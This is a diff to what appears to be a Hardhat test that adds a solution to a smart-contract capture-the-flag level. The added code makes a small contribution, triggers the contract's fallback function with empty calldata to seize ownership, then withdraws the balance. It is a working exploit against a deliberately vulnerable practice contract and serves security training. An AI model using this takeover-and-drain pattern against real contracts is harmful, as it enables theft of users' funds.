@@ -20,6 +20,19 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
+
+  console.log(await eoa.getAddress())
+  console.log((await eoa.getBalance()).toString())
+  
+  await challenge.connect(eoa).contribute({value:1})
+  console.log((await challenge.connect(eoa).getContribution()).toString())
+  
+  await eoa.sendTransaction({to:challenge.address, data:"0x", value:1}) // empty calldata -> fallback
+
+  await challenge.connect(eoa).withdraw()
+
+  console.log(await challenge.owner())
+
 });
 
 after(async () => {
